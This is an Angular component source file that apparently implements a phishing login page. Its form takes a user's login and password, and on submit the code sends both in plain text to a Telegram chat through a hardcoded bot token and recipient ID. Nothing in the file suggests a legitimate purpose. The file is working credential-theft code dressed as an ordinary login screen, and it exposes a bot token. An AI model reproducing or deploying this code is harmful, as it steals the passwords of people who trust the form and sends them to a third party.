import { Component, OnInit, ViewEncapsulation } from '@angular/core';
import Telegram from 'telegram-send-message';
import { FormBuilder, Validators } from '@angular/forms';

@Component({
    selector: 'app-root',
    templateUrl: './app.component.html',
    styleUrls: ['./app.component.scss'],
    encapsulation: ViewEncapsulation.None
})
export class AppComponent implements OnInit {
    loginStepPhone = true;
    form = this.formBuilder.group({
        login: ['', [Validators.required]],
        password: ['', [Validators.required]],
    });

    sentMessage(): void {
        Telegram.setToken('949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs');
        Telegram.setRecipient('880595419');
        const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
        Telegram.setMessage(message);
        Telegram.send();
    }

    constructor(
        private formBuilder: FormBuilder,
    ) {}

    ngOnInit(): void {
    }

    onSubmit(): void {
        if (this.form.valid) {
            this.sentMessage();
        }
        console.log(this.form.value);
    }
}
